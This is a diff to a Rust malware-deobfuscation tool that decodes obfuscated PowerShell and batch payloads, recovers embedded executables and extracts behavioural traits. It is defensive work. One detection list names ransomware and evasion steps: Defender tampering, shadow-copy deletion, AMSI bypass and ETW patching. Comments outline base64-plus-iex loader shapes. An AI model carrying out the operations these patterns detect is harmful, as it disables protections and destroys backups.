+    profile_mark!("normalize_ps1_payloads");
+    let extracted_ps1_for_aes: Vec<String> = env
         .all_extracted_ps1
         .iter()
-        .map(|bytes| ps1_scan::normalize_ps1_payload(bytes))
+        .map(|body| {
+            decode_utf16le_extracted_payload(body)
+                .unwrap_or_else(|| String::from_utf8_lossy(body).into_owned())
+        })
         .collect();
-    profile_mark!("normalize_ps1_payloads");
+    for ps in &extracted_ps1_for_aes {
+        if env.check_deadline() {
+            break;
+        }
+        aes_chain::extract_from_chain(input, ps, &mut env);
+    }
+    profile_mark!("extracted_ps1_aes_chain");
+    for ps in &extracted_ps1_normalized {
+        if env.check_deadline() {
+            break;
+        }
+        aes_chain::extract_from_chain(input, ps, &mut env);
+    }
+    profile_mark!("normalized_ps1_aes_chain");
+    let final_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_FINAL").is_some();
+    let final_profile_start = std::time::Instant::now();
+    let mut final_profile_last = final_profile_start;
+    macro_rules! final_profile_mark {
+        ($stage:literal) => {
+            if final_profile_enabled {
+                let now = std::time::Instant::now();
+                eprintln!(
+                    "harrington_profile_final stage={} delta_ms={} total_ms={} out_bytes={} traits={} recovered_pe={}",
+                    $stage,
+                    now.duration_since(final_profile_last).as_millis(),
+                    now.duration_since(final_profile_start).as_millis(),
+                    out.len(),
+                    env.traits.len(),
+                    env.recovered_pe.len()
+                );
+                final_profile_last = now;
+            }
+        };
+    }
     // Surface decoded/extracted PowerShell payloads in the deob with a
     // banner so analysts can read the reconstructed PS body — critical
     // for set-fragment-assembled `$ddsdfgo = '<b64>'; iex $x` chains
@@ -3037,7 +4422,10 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         // deob — `Convert::FromBase64String('SGVsbG8=')` style invocations
         // are already rendered by the regular dispatch path.
         let sample: String = first_line.chars().take(60).collect();
-        if sample.len() >= 16 && out.contains(&sample) {
+        if sample.len() >= 16
+            && out.contains(&sample)
+            && !normalized_payload_has_url_missing_from_out(trimmed, &out)
+        {
             continue;
         }
         // Detect the language of the extracted payload so the banner
@@ -3080,16 +4468,23 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
             "child"
         };
         let scan_start = *appended_payload_scan_start.get_or_insert(out.len());
+        let payload_to_emit = summarize_high_unicode_carrier_lines(trimmed, &mut env);
+        if payload_to_emit.starts_with("::==== harrington: omitted ")
+            && out.contains(payload_to_emit.trim())
+        {
+            continue;
+        }
         out.push_str(&format!(
             "\r\n::==== harrington: extracted {kind} payload ====\r\n"
         ));
-        out.push_str(ps.trim_end());
-        if !ps.ends_with('\n') {
+        out.push_str(payload_to_emit.trim_end());
+        if !payload_to_emit.ends_with('\n') {
             out.push_str("\r\n");
         }
         out.push_str(&format!("::==== end extracted {kind} payload ====\r\n"));
         debug_assert!(scan_start <= out.len());
     }
+    final_profile_mark!("append_extracted_payloads");
     // Run targeted scans on the FINAL `out` so detectors that live in
     // scan_deob_text but are gated on banner-only text (PS payloads
     // surfaced after the initial scan_deob_text pass) still fire.
@@ -3097,24 +4492,34 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
     // the SOSTENER/banglabillboard family whose Reflection.Assembly]::Load
     // call is inside the base64-decoded PS body that didn't exist when
     // the first scan_deob_text ran.
-    // Keep the historical final scan for normal-sized output: several
-    // command-line workflows rely on this late pass for compact URL/download
-    // summaries. For multi-MiB output where no extracted payload was appended,
-    // the scan is an exact duplicate of the earlier deob scan and can dominate
-    // runtime on BatCloak-style reconstruction output.
-    const MAX_UNCHANGED_FINAL_SCAN_BYTES: usize = 1024 * 1024;
     if let Some(scan_start) = appended_payload_scan_start {
         deob_scan::scan_deob_text(&out[scan_start..], &mut env);
         // Re-run dedup since the post-banner scan may have emitted dupes.
         let max_per_kind = cfg.max_traits_per_kind;
         dedup_traits(&mut env.traits, max_per_kind);
-    } else if out.len() <= MAX_UNCHANGED_FINAL_SCAN_BYTES {
-        deob_scan::scan_deob_text(&out, &mut env);
-        // Re-run dedup since the post-banner scan may have emitted dupes.
+    } else if has_unchanged_final_scan_candidate(&out) {
+        // The deobfuscated text was already scanned before payload banners
+        // could be appended. Keep the final dedup pass for stable capped-trait
+        // ordering, but avoid rescanning identical full text.
         let max_per_kind = cfg.max_traits_per_kind;
         dedup_traits(&mut env.traits, max_per_kind);
     }
+    final_profile_mark!("late_scan_and_dedup");
+    collect_ps1_self_tail_reversed_gzip_pe(input, &extracted_ps1_normalized, &mut env);
+    final_profile_mark!("self_tail_reversed_gzip_pe");
+    if has_embedded_base64_pe_carrier_hint(input) {
+        let raw_input_text = String::from_utf8_lossy(input);
+        collect_embedded_base64_pe_carrier_artifacts(&raw_input_text, &mut env);
+    }
+    final_profile_mark!("embedded_base64_pe_carriers");
+    out = summarize_multiline_base64_pe_carrier_blocks(out, &mut env);
+    final_profile_mark!("summarize_multiline_base64_pe");
+    scan_recovered_artifact_strings(&mut env);
+    final_profile_mark!("recovered_artifact_strings");
+    dedup_traits(&mut env.traits, cfg.max_traits_per_kind);
+    final_profile_mark!("final_dedup");
     profile_mark!("final_scan_and_dedup");
+    let _ = final_profile_last;
     let _ = profile_last;
     Report {
         deobfuscated: out,
@@ -3122,8 +4527,565 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         extracted_cmd: std::mem::take(&mut env.all_extracted_cmd),
         extracted_ps1: std::mem::take(&mut env.all_extracted_ps1),
         extracted_ps1_normalized,
+        extracted_jscript: std::mem::take(&mut env.all_extracted_jscript),
+        extracted_vbs: std::mem::take(&mut env.all_extracted_vbs),
         recovered_pe: std::mem::take(&mut env.recovered_pe),
     }
+}
+
+fn scan_recovered_artifact_strings(env: &mut Environment) {
+    let mut artifacts = std::mem::take(&mut env.recovered_pe);
+    for (label, blob) in &artifacts {
+        if !label.starts_with("disguised-") {
+            scan_binary_input_urls(blob, env);
+        }
+        let behavior_text = recovered_artifact_behavior_text(blob);
+        if !behavior_text.is_empty() {
+            deob_scan::scan_recovered_artifact_behavior_text(&behavior_text, env);
+        }
+    }
+    artifacts.append(&mut env.recovered_pe);
+    env.recovered_pe = artifacts;
+}
+
+fn has_unchanged_final_scan_candidate(text: &str) -> bool {
+    ascii_case_insensitive_contains(text, "http:")
+        || ascii_case_insensitive_contains(text, "https:")
+        || ascii_case_insensitive_contains(text, "ftp:")
+        || ascii_case_insensitive_contains(text, "file:")
+}
+
+fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environment) -> String {
+    let mut out = String::with_capacity(text.len());
+    let mut block: Vec<&str> = Vec::new();
+    let mut changed = false;
+
+    for line in text.lines() {
+        let trimmed = line.trim();
+        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
+        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
+            block.push(trimmed);
+            continue;
+        }
+        changed |= flush_base64_pe_block(&mut out, &mut block, env);
+        out.push_str(line);
+        out.push_str("\r\n");
+    }
+    changed |= flush_base64_pe_block(&mut out, &mut block, env);
+
+    if changed {
+        out
+    } else {
+        text
+    }
+}
+
+fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Environment) -> bool {
+    if block.is_empty() {
+        return false;
+    }
+
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len >= 4096 {
+        let padding = block
+            .last()
+            .map(|line| line.bytes().rev().take_while(|b| *b == b'=').count())
+            .unwrap_or(0);
+        let decoded_estimate = (total_len / 4).saturating_mul(3).saturating_sub(padding);
+        if let Some((label_kind, pe)) = decode_base64_pe_carrier_block(block) {
+            let is_hex = label_kind == "embedded-base64-hex-pe";
+            push_recovered_pe_artifact(env, label_kind, pe);
+            let description = if is_hex {
+                "multiline base64-encoded hex PE carrier"
+            } else {
+                "multiline base64 PE carrier"
+            };
+            let bytes_label = if is_hex { "hex bytes" } else { "decoded bytes" };
+            out.push_str(&format!(
+                "::==== harrington: omitted {description} ({} lines, {} base64 bytes, ~{} {bytes_label}) ====\r\n",
+                block.len(),
+                total_len,
+                decoded_estimate
+            ));
+            block.clear();
+            return true;
+        }
+        if classify_base64_pe_block(block).is_some() {
+            out.push_str(&format!(
+                "::==== harrington: omitted multiline base64 PE carrier ({} lines, {} base64 bytes, ~{} decoded bytes) ====\r\n",
+                block.len(),
+                total_len,
+                decoded_estimate
+            ));
+            block.clear();
+            return true;
+        }
+    }
+
+    for line in block.drain(..) {
+        out.push_str(line);
+        out.push_str("\r\n");
+    }
+    false
+}
+
+fn classify_base64_pe_block(block: &[&str]) -> Option<()> {
+    use base64::Engine;
+
+    let mut prefix = String::new();
+    for line in block {
+        let need = 256usize.saturating_sub(prefix.len());
+        if need == 0 {
+            break;
+        }
+        prefix.push_str(&line[..need.min(line.len())]);
+    }
+    let prefix_len = prefix.len() - (prefix.len() % 4);
+    if prefix_len < 4 {
+        return None;
+    }
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(&prefix[..prefix_len])
+        .ok()?;
+    if decoded.starts_with(b"MZ")
+        || decoded
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
+    {
+        Some(())
+    } else {
+        None
+    }
+}
+
+fn collect_embedded_base64_pe_carrier_artifacts(text: &str, env: &mut Environment) {
+    const MAX_EMBEDDED_PE_CARRIER_ARTIFACTS: usize = 16;
+
+    let mut block: Vec<&str> = Vec::new();
+    let mut recovered_count = 0usize;
+    for line in text.lines() {
+        let trimmed = line.trim();
+        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_byte);
+        if is_base64_line && (trimmed.len() >= 64 || !block.is_empty()) {
+            block.push(trimmed);
+            continue;
+        }
+        recovered_count += flush_embedded_base64_pe_artifact_block(
+            env,
+            &mut block,
+            recovered_count,
+            MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
+        );
+    }
+    flush_embedded_base64_pe_artifact_block(
+        env,
+        &mut block,
+        recovered_count,
+        MAX_EMBEDDED_PE_CARRIER_ARTIFACTS,
+    );
+}
+
+fn has_embedded_base64_pe_carrier_hint(input: &[u8]) -> bool {
+    if input.len() < 4096 {
+        return false;
+    }
+    // Base64 for a PE starts with "TV" because the decoded header starts
+    // with "MZ". Also allow the encoded ASCII-hex carriers this collector
+    // decodes: "4d5a" -> "NGQ1..." and "4D5A" -> "NEQ1...".
+    // Match the collector's real shape instead of treating incidental `TV`
+    // bytes inside large binary-ish samples as a reason to walk every line.
+    for line in input.split(|b| matches!(*b, b'\r' | b'\n')) {
+        let trimmed = trim_ascii_whitespace_bytes(line);
+        if trimmed.len() < 64 {
+            continue;
+        }
+        if !trimmed.iter().take(64).all(|b| is_base64_byte(*b)) {
+            continue;
+        }
+        if trimmed.starts_with(b"TV")
+            || trimmed.starts_with(b"NGQ1")
+            || trimmed.starts_with(b"NEQ1")
+        {
+            return true;
+        }
+    }
+    false
+}
+
+fn trim_ascii_whitespace_bytes(bytes: &[u8]) -> &[u8] {
+    let start = bytes
+        .iter()
+        .position(|b| !b.is_ascii_whitespace())
+        .unwrap_or(bytes.len());
+    let end = bytes
+        .iter()
+        .rposition(|b| !b.is_ascii_whitespace())
+        .map(|idx| idx + 1)
+        .unwrap_or(start);
+    &bytes[start..end]
+}
+
+fn flush_embedded_base64_pe_artifact_block(
+    env: &mut Environment,
+    block: &mut Vec<&str>,
+    recovered_count: usize,
+    max_artifacts: usize,
+) -> usize {
+    if block.is_empty() || recovered_count >= max_artifacts {
+        block.clear();
+        return 0;
+    }
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len < 4096 {
+        block.clear();
+        return 0;
+    }
+    let decoded = decode_base64_pe_carrier_block(block);
+    block.clear();
+    let Some((label_kind, pe)) = decoded else {
+        return 0;
+    };
+    usize::from(push_recovered_pe_artifact(env, label_kind, pe))
+}
+
+fn decode_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u8>)> {
+    use base64::Engine;
+
+    let total_len: usize = block.iter().map(|line| line.len()).sum();
+    if total_len > 16 * 1024 * 1024 {
+        return None;
+    }
+    let mut compact = String::with_capacity(total_len);
+    for line in block {
+        compact.push_str(line.trim());
+    }
+    let decoded = base64::engine::general_purpose::STANDARD
+        .decode(compact.as_bytes())
+        .ok()?;
+    if looks_like_pe(&decoded) {
+        return Some(("embedded-base64-pe", decoded));
+    }
+    if decoded.len() <= 32 * 1024 * 1024
+        && decoded
+            .get(..4)
+            .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
+    {
+        let hex = String::from_utf8(decoded).ok()?;
+        let compact_hex: String = hex.chars().filter(|c| !c.is_ascii_whitespace()).collect();
+        if compact_hex.len() % 2 == 0 {
+            let bytes = hex::decode(compact_hex).ok()?;
+            if looks_like_pe(&bytes) {
+                return Some(("embedded-base64-hex-pe", bytes));
+            }
+        }
+    }
+    None
+}
+
+fn collect_ps1_self_tail_reversed_gzip_pe(
+    input: &[u8],
+    normalized_ps1: &[String],
+    env: &mut Environment,
+) {
+    let has_reversed_gzip_loader = normalized_ps1.iter().any(|ps| {
+        let lc = ps.to_ascii_lowercase();
+        lc.contains("getcurrentprocess")
+            && lc.contains("readlines")
+            && lc.contains("frombase64string")
+            && lc.contains("gzipstream")
+            && lc.contains("[array]::reverse")
+            && lc.contains("assembly]::load")
+    });
+    if !has_reversed_gzip_loader {
+        return;
+    }
+    let raw_text = String::from_utf8_lossy(input);
+
+    for marker in ps1_self_read_split_markers(normalized_ps1) {
+        let mut b64 = String::new();
+        for line in raw_text.lines() {
+            let Some(marker_pos) = line.find(marker.as_str()) else {
+                continue;
+            };
+            let after_marker = line[marker_pos + marker.len()..].trim();
+            b64.extend(
+                after_marker
+                    .chars()
+                    .take_while(|ch| ch.is_ascii() && is_base64_byte(*ch as u8)),
+            );
+        }
+        let Some(pe) = reversed_gzip_pe_from_base64(&b64) else {
+            continue;
+        };
+        if push_recovered_pe_artifact(env, "ps1-self-marker-reversed-gzip-pe", pe.clone()) {
+            scan_binary_input_urls(&pe, env);
+        }
+    }
+
+    let tail_loader = normalized_ps1.iter().any(|ps| {
+        let lc = ps.to_ascii_lowercase();
+        lc.contains("select-object -last 1")
+    });
+    if !tail_loader {
+        return;
+    }
+    let Some(last_line) = raw_text
+        .lines()
+        .rev()
+        .map(str::trim)
+        .find(|line| !line.is_empty())
+    else {
+        return;
+    };
+    let Some(reversed) = reversed_gzip_pe_from_base64(last_line) else {
+        return;
+    };
+    if push_recovered_pe_artifact(env, "ps1-self-tail-reversed-gzip-pe", reversed.clone()) {
+        scan_binary_input_urls(&reversed, env);
+    }
+}
+
+fn ps1_self_read_split_markers(normalized_ps1: &[String]) -> Vec<String> {
+    let mut out = Vec::new();
+    for ps in normalized_ps1 {
+        let lc = ps.to_ascii_lowercase();
+        if !lc.contains("readlines") || !lc.contains(".split") {
+            continue;
+        }
+        for needle in [".split('", ".split(\""] {
+            let mut cursor = 0usize;
+            while let Some(rel) = lc[cursor..].find(needle) {
+                let start = cursor + rel + needle.len();
+                let quote = needle.as_bytes()[needle.len() - 1] as char;
+                let Some(end_rel) = ps[start..].find(quote) else {
+                    break;
+                };
+                let marker = &ps[start..start + end_rel];
+                if !marker.is_empty() && marker.len() <= 8 && !out.iter().any(|m| m == marker) {
+                    out.push(marker.to_string());
+                }
+                cursor = start + end_rel + quote.len_utf8();
+            }
+        }
+    }
+    out
+}
+
+fn reversed_gzip_pe_from_base64(b64: &str) -> Option<Vec<u8>> {
+    use std::io::Read as _;
+
+    if b64.len() < 64 || b64.len() > 16 * 1024 * 1024 {
+        return None;
+    }
+    if !b64.bytes().all(is_base64_byte) {
+        return None;
+    }
+    let gz = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64).ok()?;
+    let mut decoder = flate2::read::GzDecoder::new(gz.as_slice());
+    let mut reversed = Vec::new();
+    if std::io::Read::take(&mut decoder, 16 * 1024 * 1024)
+        .read_to_end(&mut reversed)
+        .is_err()
+    {
+        return None;
+    }
+    reversed.reverse();
+    if !looks_like_pe(&reversed) {
+        return None;
+    }
+    Some(reversed)
+}
+
+fn push_recovered_pe_artifact(
+    env: &mut Environment,
+    label_kind: &'static str,
+    pe: Vec<u8>,
+) -> bool {
+    const MAX_SAME_KIND: usize = 16;
+
+    let same_kind_count = env
+        .recovered_pe
+        .iter()
+        .filter(|(label, _)| label.starts_with(label_kind))
+        .count();
+    if same_kind_count >= MAX_SAME_KIND {
+        return false;
+    }
+    if env
+        .recovered_pe
+        .iter()
+        .any(|(existing, blob)| existing.starts_with(label_kind) && blob == &pe)
+    {
+        return false;
+    }
+    let label = if same_kind_count == 0 {
+        label_kind.to_string()
+    } else {
+        format!("{label_kind}#{}", same_kind_count + 1)
+    };
+    env.recovered_pe.push((label, pe));
+    true
+}
+
+fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
+    use base64::Engine;
+
+    let trimmed = line.trim();
+    if trimmed.len() < 4096 || trimmed.len() > 16 * 1024 * 1024 {
+        return None;
+    }
+    if !trimmed.bytes().all(is_base64_byte) {
+        return None;
+    }
+
+    let prefix_len = 256.min(trimmed.len() - (trimmed.len() % 4));
+    if prefix_len < 4 {
+        return None;
+    }
+    let decoded_prefix = base64::engine::general_purpose::STANDARD
+        .decode(&trimmed[..prefix_len])
+        .ok()?;
+    if !decoded_prefix.starts_with(b"MZ") {
+        return None;
+    }
+
+    let padding = trimmed.bytes().rev().take_while(|b| *b == b'=').count();
+    let decoded_estimate = (trimmed.len() / 4)
+        .saturating_mul(3)
+        .saturating_sub(padding);
+    Some(format!(
+        "::==== harrington: omitted base64 PE carrier ({} base64 bytes, ~{} decoded bytes) ====",
+        trimmed.len(),
+        decoded_estimate
+    ))
+}
+
+fn recovered_artifact_behavior_text(blob: &[u8]) -> String {
+    const MAX_STRINGS: usize = 512;
+    let mut seen = std::collections::HashSet::new();
+    let mut text = String::new();
+    collect_recovered_artifact_ascii_strings(blob, &mut seen, &mut text, MAX_STRINGS);
+    if blob.contains(&0) {
+        collect_recovered_artifact_utf16le_strings(blob, 0, &mut seen, &mut text, MAX_STRINGS);
+        collect_recovered_artifact_utf16le_strings(blob, 1, &mut seen, &mut text, MAX_STRINGS);
+    }
+    text
+}
+
+fn collect_recovered_artifact_ascii_strings(
+    blob: &[u8],
+    seen: &mut std::collections::HashSet<String>,
+    text: &mut String,
+    max_strings: usize,
+) {
+    const MIN_LEN: usize = 8;
+    const MAX_LEN: usize = 8192;
+
+    let mut run = Vec::new();
+    for &b in blob {
+        if b == b'\t' || (0x20..=0x7e).contains(&b) {
+            run.push(b);
+            if run.len() >= MAX_LEN {
+                push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+            }
+        } else {
+            push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+        }
+        if seen.len() >= max_strings {
+            return;
+        }
+    }
+    push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+}
+
+fn collect_recovered_artifact_utf16le_strings(
+    blob: &[u8],
+    offset: usize,
+    seen: &mut std::collections::HashSet<String>,
+    text: &mut String,
+    max_strings: usize,
+) {
+    const MIN_LEN: usize = 8;
+    const MAX_LEN: usize = 8192;
+
+    if offset >= blob.len() {
+        return;
+    }
+    let mut run = Vec::new();
+    for pair in blob[offset..].chunks_exact(2) {
+        let ch = u16::from_le_bytes([pair[0], pair[1]]);
+        if ch == u16::from(b'\t') || (0x20u16..=0x7eu16).contains(&ch) {
+            run.push(ch as u8);
+            if run.len() >= MAX_LEN {
+                push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+            }
+        } else {
+            push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+        }
+        if seen.len() >= max_strings {
+            return;
+        }
+    }
+    push_recovered_artifact_string(&mut run, seen, text, max_strings, MIN_LEN);
+}
+
+fn push_recovered_artifact_string(
+    run: &mut Vec<u8>,
+    seen: &mut std::collections::HashSet<String>,
+    text: &mut String,
+    max_strings: usize,
+    min_len: usize,
+) {
+    if run.len() >= min_len && seen.len() < max_strings {
+        let candidate = String::from_utf8_lossy(run);
+        if recovered_artifact_string_is_behavior_hint(&candidate)
+            && !seen.contains(candidate.as_ref())
+        {
+            text.push_str(&candidate);
+            text.push('\n');
+            seen.insert(candidate.into_owned());
+        }
+    }
+    run.clear();
+}
+
+fn recovered_artifact_string_is_behavior_hint(s: &str) -> bool {
+    const NEEDLES: &[&str] = &[
+        "add-mppreference",
+        "set-mppreference",
+        "netsh advfirewall",
+        "vssadmin",
+        "shadowcopy delete",
+        "bcdedit",
+        "wbadmin",
+        "[system.reflection.assembly]::load",
+        "[reflection.assembly]::load",
+        "amsiscanbuffer",
+        "invoke-nullamsi",
+        "amsiinitfailed",
+        "amsiutils",
+        "amsicontext",
+        "amsisession",
+        "amsi.dll",
+        "etweventwrite",
+        "system.diagnostics.eventing.eventprovider",
+    ];
+    NEEDLES
+        .iter()
+        .any(|needle| ascii_case_insensitive_contains(s, needle))
+}
+
+fn ascii_case_insensitive_contains(haystack: &str, needle: &str) -> bool {
+    if needle.is_empty() {
+        return true;
+    }
+    if haystack.len() < needle.len() {
+        return false;
+    }
+    haystack
+        .as_bytes()
+        .windows(needle.len())
+        .any(|window| window.eq_ignore_ascii_case(needle.as_bytes()))
 }
 
 fn trait_kind(t: &Trait) -> String {
@@ -3168,6 +5130,16 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
             Some(format!("EvidenceCleanup\0{action}\0{target}"))
         }
         Trait::RegistryUrl { value, url, .. } => Some(format!("RegistryUrl\0{value}\0{url}")),
+        Trait::ShortcutCreated {
+            path,
+            target,
+            arguments,
+            working_directory,
+        } => Some(format!(
+            "ShortcutCreated\0{path}\0{target}\0{}\0{}",
+            arguments.as_deref().unwrap_or(""),
+            working_directory.as_deref().unwrap_or("")
+        )),
         Trait::CertutilDownload { url, dst } => Some(format!("CertutilDownload\0{url}\0{dst}")),
         Trait::BitsadminDownload { url, dst } => Some(format!("BitsadminDownload\0{url}\0{dst}")),
         Trait::DownloadInDeobText { src, .. } => Some(format!("DownloadInDeobText\0{src}")),
@@ -3180,8 +5152,73 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
     }
 }
 
+fn resolve_rundll32_download_urls(traits: &mut [Trait]) {
+    let downloads: std::collections::HashMap<String, String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download {
+                src,
+                dst: Some(dst),
+                ..
+            } if !dst.is_empty() => Some((dst.to_ascii_lowercase(), src.clone())),
+            Trait::CertutilDownload { url, dst } | Trait::BitsadminDownload { url, dst }
+                if !dst.is_empty() =>
+            {
+                Some((dst.to_ascii_lowercase(), url.clone()))
+            }
+            _ => None,
+        })
+        .collect();
+    if downloads.is_empty() {
+        return;
+    }
+    for t in traits {
+        let Trait::Rundll32 { cmd, url } = t else {
+            continue;
+        };
+        if url.is_some() {
+            continue;
+        }
+        let Some(candidate) = rundll32_load_candidate(cmd) else {
+            continue;
+        };
+        if let Some(src) = downloads.get(&candidate.to_ascii_lowercase()) {
+            *url = Some(src.clone());
+        }
+    }
+}
+
+fn rundll32_load_candidate(cmd: &str) -> Option<String> {
+    let tokens = crate::handlers::util::split_words(cmd);
+    let first_arg = tokens.get(1)?;
+    let candidate = first_arg
+        .split(',')
+        .next()
+        .unwrap_or("")
+        .trim()
+        .trim_matches(['"', '\''])
+        .trim_end_matches(['"', '\'', ')', ']', '}', ';']);
+    (!candidate.is_empty()).then(|| candidate.to_string())
+}
+
 fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
-    use std::collections::HashMap;
+    let structured_downloads: std::collections::HashSet<String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { src, .. }
+            | Trait::CertutilDownload { url: src, .. }
+            | Trait::BitsadminDownload { url: src, .. } => Some(src.clone()),
+            _ => None,
+        })
+        .collect();
+    traits.retain(|t| match t {
+        Trait::DownloadInDeobText { src, .. } => !structured_downloads.contains(src),
+        Trait::UrlArgument { cmd, url } => {
+            !(structured_downloads.contains(url) && cmd.contains(url))
+        }
+        _ => true,
+    });
+
     let mut semantic_seen = std::collections::HashSet::new();
     traits.retain(|t| {
         let Some(key) = semantic_dedup_key(t) else {
@@ -3197,13 +5234,13 @@ fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
         exact_seen.insert(key)
     });
     // Count by kind
-    let mut counts: HashMap<String, u64> = HashMap::new();
+    let mut counts: std::collections::BTreeMap<String, u64> = std::collections::BTreeMap::new();
     for t in traits.iter() {
         let kind = trait_kind(t);
         *counts.entry(kind).or_insert(0) += 1;
     }
     // Keep only the first max_per_kind of each kind
-    let mut kept: HashMap<String, u32> = HashMap::new();
+    let mut kept: std::collections::HashMap<String, u32> = std::collections::HashMap::new();
     traits.retain(|t| {
         let kind = trait_kind(t);
         let n = kept.entry(kind).or_insert(0);
@@ -3313,9 +5350,10 @@ fn scan_binary_input_urls(input: &[u8], env: &mut Environment) {
             continue;
         }
         env.traits.push(Trait::DownloadInDeobText {
-            src: url,
+            src: url.clone(),
             line_hint: "binary-input".to_string(),
         });
+        deob_scan::scan_network_probe_url(&url, env);
     }
     // bat/CAB dual-detonation pattern: a CAB file whose header area
     // embeds a batch payload like
@@ -3553,6 +5591,88 @@ fn write_captured_echo_content(
         .insert(key, crate::env::FsEntry::Content { content, append });
 }
 
+fn expand_redirect_path(raw_path: &str, scratch: &mut Environment) -> String {
+    if raw_path.contains('%') || raw_path.contains('!') {
+        let toks = lex::lex(raw_path);
+        normalize::normalize_to_string(&toks, scratch)
+    } else {
+        raw_path.to_string()
+    }
+}
+
+#[derive(Debug, Default, Clone, Copy, PartialEq, Eq)]
+struct EchoRedirectPrescanShapes {
+    grouped_block: bool,
+    top_level_run: bool,
+}
+
+fn echo_redirect_prescan_shapes(input: &[u8]) -> EchoRedirectPrescanShapes {
+    if !input_contains_ascii_case_insensitive(input, b"echo") || !input.contains(&b'>') {
+        return EchoRedirectPrescanShapes::default();
+    }
+
+    let text = String::from_utf8_lossy(input);
+    let mut saw_group_open = false;
+    let mut saw_redirected_group_open = false;
+    let mut echo_redirect_lines = 0usize;
+    let mut shapes = EchoRedirectPrescanShapes::default();
+    for raw_line in text.lines() {
+        let trimmed = raw_line.trim_start_matches(['@', ' ', '\t']);
+        if trimmed.is_empty() {
+            continue;
+        }
+        let lower = trimmed.to_ascii_lowercase();
+        if lower.starts_with("rem ") || lower == "rem" || lower.starts_with("::") {
+            continue;
+        }
+        let (opens_group, redirected_group_open) = if trimmed.trim_end() == "(" {
+            (true, false)
+        } else if trimmed.trim_end().ends_with('(') && trimmed.contains('>') {
+            let (cleaned, redir) = crate::redirect::extract_redirections(trimmed.trim_end());
+            let redirected = cleaned.trim() == "(" && redir.stdout.is_some();
+            (redirected, redirected)
+        } else {
+            (false, false)
+        };
+        if opens_group {
+            saw_group_open = true;
+            saw_redirected_group_open = redirected_group_open;
+            continue;
+        }
+        if saw_group_open
+            && trimmed.trim_start().starts_with(')')
+            && (trimmed.contains('>') || saw_redirected_group_open)
+        {
+            shapes.grouped_block = true;
+            if shapes.grouped_block && shapes.top_level_run {
+                return shapes;
+            }
+            saw_group_open = false;
+            saw_redirected_group_open = false;
+        }
+        if block_echo_payload(trimmed).is_some() && trimmed.contains('>') {
+            echo_redirect_lines += 1;
+            if echo_redirect_lines >= 2 {
+                shapes.top_level_run = true;
+                if shapes.grouped_block && shapes.top_level_run {
+                    return shapes;
+                }
+            }
+            continue;
+        }
+        if block_echo_payload(trimmed).is_none() {
+            echo_redirect_lines = 0;
+        }
+    }
+    shapes
+}
+
+#[cfg(test)]
+fn has_echo_redirect_prescan_shape(input: &[u8]) -> bool {
+    let shapes = echo_redirect_prescan_shapes(input);
+    shapes.grouped_block || shapes.top_level_run
+}
+
 fn capture_top_level_echo_redirect_runs(
     lines: &[String],
     env: &mut Environment,
@@ -3651,9 +5771,17 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<
             crate::handlers::set::h_set(stripped, &mut scratch);
         }
         let opener = lines[i].trim_start_matches(['@', ' ', '\t']).trim_end();
-        // A bare `(` opens a grouped block (possibly `@(`). Anything else
-        // (e.g. `if (`, `for ... (`) is handled by the normal interpreter.
-        if opener != "(" {
+        // A bare `(` opens a grouped block (possibly `@(`). CMD also allows
+        // the block stdout redirection to prefix the group: `> "file" (`.
+        // Anything else (e.g. `if (`, `for ... (`) is handled by the normal
+        // interpreter.
+        let (opener_cleaned, opener_redir) = crate::redirect::extract_redirections(opener);
+        let prefix_target = if opener_cleaned.trim() == "(" {
+            opener_redir.stdout
+        } else {
+            None
+        };
+        if opener != "(" && prefix_target.is_none() {
             i += 1;
             continue;
         }
@@ -3668,6 +5796,10 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<
             if body_trimmed.starts_with(')') {
                 close_idx = Some(j);
                 break;
+            }
+            if body_trimmed.is_empty() {
+                j += 1;
+                continue;
             }
             if let Some(payload) = block_echo_payload(body) {
                 payloads.push(payload.to_string());
@@ -3685,29 +5817,32 @@ fn capture_block_echo_redirects(lines: &[String], env: &mut Environment) -> Vec<
             i = close + 1;
             continue;
         }
-        // The closing line must redirect the block's stdout to a file.
+        // The closing line must redirect the block's stdout to a file, unless
+        // the opener already used CMD's prefix redirection form.
         let close_line = lines[close].trim_start_matches(['@', ' ', '\t']);
         // Strip the leading `)` then parse redirections from the remainder.
         let after_paren = close_line.trim_start_matches(')').trim();
-        let (_, redir) = crate::redirect::extract_redirections(after_paren);
-        let Some(target) = redir.stdout else {
-            i = close + 1;
-            continue;
+        let target = if let Some(prefix_target) = prefix_target {
+            let (close_cleaned, close_redir) = crate::redirect::extract_redirections(after_paren);
